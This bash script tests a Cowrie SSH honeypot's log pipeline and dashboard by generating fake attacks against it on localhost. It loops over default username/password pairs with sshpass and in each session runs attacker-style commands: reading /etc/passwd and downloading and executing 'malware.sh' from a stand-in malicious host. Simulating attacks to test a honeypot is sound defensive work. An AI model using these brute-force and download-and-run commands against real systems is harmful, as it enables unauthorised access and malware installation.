#!/bin/bash

echo "🧪 Testing Permanent Log Solution..."

# Check if log sync is running
if pgrep -f "sync-cowrie-logs.sh" > /dev/null; then
    echo "✅ Log sync process is running"
else
    echo "⚠️ Log sync process not running, starting it..."
    ./sync-cowrie-logs.sh &
    echo "Started log sync with PID: $!"
    sleep 3
fi

# Install sshpass if needed
if ! command -v sshpass >/dev/null 2>&1; then
    echo "📦 Installing sshpass..."
    sudo apt update && sudo apt install -y sshpass
fi

# Generate test attacks
echo "🎯 Generating test attacks..."
credentials=(
    "root:admin"
    "admin:password"
    "user:123456"
    "guest:guest"
    "test:test"
)

for cred in "${credentials[@]}"; do
    username=$(echo $cred | cut -d: -f1)
    password=$(echo $cred | cut -d: -f2)
    
    echo "  🔑 Testing $username:$password"
    
    timeout 10 sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 "$username@localhost" << EOF 2>/dev/null
whoami
id
ls -la
cat /etc/passwd
ps aux | head -10
uname -a
wget http://malicious.example.com/malware.sh
chmod +x malware.sh
./malware.sh
exit
EOF
    
    sleep 2
done

# Wait for logs to be synced
echo "⏳ Waiting for logs to be synced..."
sleep 10

# Check our accessible log file
LOG_FILE="$(pwd)/cowrie-logs/cowrie.json"
echo ""
echo "📝 Checking accessible log file: $LOG_FILE"

if [ -f "$LOG_FILE" ]; then
    echo "✅ Log file exists!"
    echo "📊 File size: $(du -h "$LOG_FILE" | cut -f1)"
    echo "📄 Line count: $(wc -l < "$LOG_FILE")"
    echo "🔒 Permissions: $(ls -la "$LOG_FILE")"
    
    if [ -s "$LOG_FILE" ]; then
        echo ""
        echo "📝 Recent log entries:"
        tail -5 "$LOG_FILE" | jq . 2>/dev/null || tail -5 "$LOG_FILE"
        
        echo ""
        echo "✅ SUCCESS! Log file is working and accessible!"
    else
        echo "📝 Log file is empty - may need more time for sync"
    fi
else
    echo "❌ Log file not found"
fi

# Test API endpoints
echo ""
echo "🧪 Testing API endpoints..."
if pgrep -f "next dev" > /dev/null; then
    echo "Testing events API..."
    curl -s http://localhost:3000/api/cowrie/events | jq .success 2>/dev/null || echo "API response received"
    
    echo "Testing stats API..."
    curl -s http://localhost:3000/api/cowrie/stats | jq .success 2>/dev/null || echo "API response received"
else
    echo "⚠️ Development server not running"
    echo "Start it with: npm run dev"
fi

echo ""
echo "✅ Test complete!"
echo "📊 Dashboard: http://localhost:3000"
